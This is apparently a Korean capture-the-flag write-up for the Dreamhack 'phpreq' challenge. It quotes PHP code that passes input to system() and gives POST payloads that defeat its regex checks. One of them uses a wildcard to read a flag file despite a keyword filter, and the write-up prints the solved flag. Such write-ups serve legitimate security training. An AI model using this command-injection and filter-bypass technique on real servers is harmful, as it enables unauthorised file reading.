## phpreq

> 문제 URL: https://dreamhack.io/wargame/challenges/873  
> php로 작성된 페이지입니다. 알맞은 Nickname과 Password를 입력하면 Step 2로 넘어갈 수 있습니다. Step 2에서 system() 함수를 이용하여 플래그를 획득하세요. 플래그는 ../dream/flag.txt에 위치합니다.

### Solve

1. php에서 ID/PW 매칭하는 코드

```php
<?php
    // POST request
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
      $input_name = $_POST["input1"] ? $_POST["input1"] : "";
      $input_pw = $_POST["input2"] ? $_POST["input2"] : "";
      // pw filtering
      if (preg_match("/[a-zA-Z]/", $input_pw)) {
        echo "alphabet in the pw :(";
      }
      else{
        $name = preg_replace("/nyang/i", "", $input_name);
        $pw = preg_replace("/\d*\@\d{2,3}(31)+[^0-8\"]\!/", "d4y0r50ng", $input_pw);

        if ($name === "dnyang0310" && $pw === "d4y0r50ng+1+13") {
          echo '<h4>Step 2 : Almost done...</h4><div class="door_box"><div class="door_black"></div><div class="door"><div class="door_cir"></div></div></div>';
          $cmd = $_POST["cmd"] ? $_POST["cmd"] : "";
          if ($cmd === "") {
            echo '
                  <p><form method="post" action="/step2.php">
                      <input type="hidden" name="input1" value="'.$input_name.'">
                      <input type="hidden" name="input2" value="'.$input_pw.'">
                      <input type="text" placeholder="Command" name="cmd">
                      <input type="submit" value="제출"><br/><br/>
                  </form></p>
            ';
          }
          // cmd filtering
          else if (preg_match("/flag/i", $cmd)) {
            echo "<pre>Error!</pre>";
          }
          else{
            echo "<pre>--Output--\n";
            system($cmd);
            echo "</pre>";
          }
        }
        else{
          echo "Wrong nickname or pw";
        }
      }
    }
    // GET request
    else{
      echo "Not GET request";
    }
?>
```

2. input 과정에서 정규식을 고려해서 body로 넘겨주는 데이터, `fiddler composer` 활용

```bash
input1=dnyanyangng0310&input2=123@12331319!%2B1%2B13&cmd=cat%20%2E%2E%2Fdream%2Fflag%2Etxt
```

3. 2번 방법으로 하면 `flag` 문자열 필터링 하는 곳에서 막힘, 그래서 리눅스의 wildcard 문자(`?`) 활용해서 `ls`의 결과를 cat

```bash
input1=dnyanyangng0310&input2=123@12331319!%2B1%2B13&cmd=cat%20%2E%2E%2Fdream%2Ffla%3F.txt
```

4. response 결과로부터 flag 획득

```html
<pre>
--Output-- DH{ad866c64dabaf30136e22d3de2980d24c4da617b9d706f81d10a1bc97d0ab6f6}</pre
>
```
